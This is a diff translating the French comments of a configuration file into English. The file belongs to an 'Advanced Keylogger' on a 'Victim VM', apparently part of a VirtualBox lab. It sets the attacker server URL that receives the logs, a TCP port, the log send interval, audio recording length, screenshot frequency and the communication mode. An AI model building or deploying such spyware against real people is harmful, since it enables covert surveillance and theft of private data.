@@ -1,32 +1,32 @@
-# Fichier de configuration pour le Keylogger Avancé (VM Victime)
+# Configuration File for the Advanced Keylogger (Victim VM)
 
-# --- CONFIGURATION DU SERVEUR DE RÉCEPTION ---
-# IP de la machine attaquante. Utilisez l'IP de la VM attaquante.
-# NOTE : En mode Réseau Interne VirtualBox, l'IP ne sera PAS 127.0.0.1.
-# Remplacez 127.0.0.1 par l'adresse réelle de la VM Attaquante (ex: "http://192.168.56.101:5000/log")
+# --- RECEPTION SERVER CONFIGURATION ---
+# IP address of the attacker machine. Use the actual IP of the Attacker VM.
+# NOTE: In VirtualBox Internal Network mode, the IP will NOT be 127.0.0.1.
+# Replace 127.0.0.1 with the actual address of the Attacker VM (e.g., "http://192.168.56.101:5000/log")
 SERVER_URL = "http://127.0.0.1:5000/log"
 
-# Port pour la communication Socket TCP (si le mode TCP est activé)
+# Port for TCP Socket communication (if TCP mode is activated)
 TCP_PORT = 5001
 
-# Fréquence d'envoi des logs vers le serveur (en secondes)
+# Frequency (in seconds) for sending the logs to the server
 SEND_INTERVAL = 5
 
 
-# --- CONFIGURATION DES CAPTURES ---
+# --- CAPTURE CONFIGURATION ---
 
-# 1. Configuration Audio
-# Durée de chaque clip audio enregistré avant l'enregistrement de l'événement (en secondes)
+# 1. Audio Configuration
+# Duration of each recorded audio clip before the event is saved (in seconds)
 AUDIO_RECORD_SECONDS = 5
-# Taux d'échantillonnage standard (Hz)
+# Standard sampling rate (Hz)
 AUDIO_RATE = 44100
 
-# 2. Configuration Screenshot
-# Intervalle entre les captures d'écran (en secondes). Attention au volume de données!
+# 2. Screenshot Configuration
+# Interval between screen captures (in seconds). Be mindful of data volume!
 SCREENSHOT_INTERVAL = 15
 
 
-# --- CONFIGURATION DU MODE DE COMMUNICATION ---
-# Mode de communication actif au démarrage. Utilisé pour la résilience et la commande switch_mode.
-# Valeurs possibles : "http" ou "tcp"
+# --- COMMUNICATION MODE CONFIGURATION ---
+# Active communication mode on startup. Used for resilience and potential switch_mode commands.
+# Possible values: "http" or "tcp"
 INITIAL_COMM_MODE = "http"
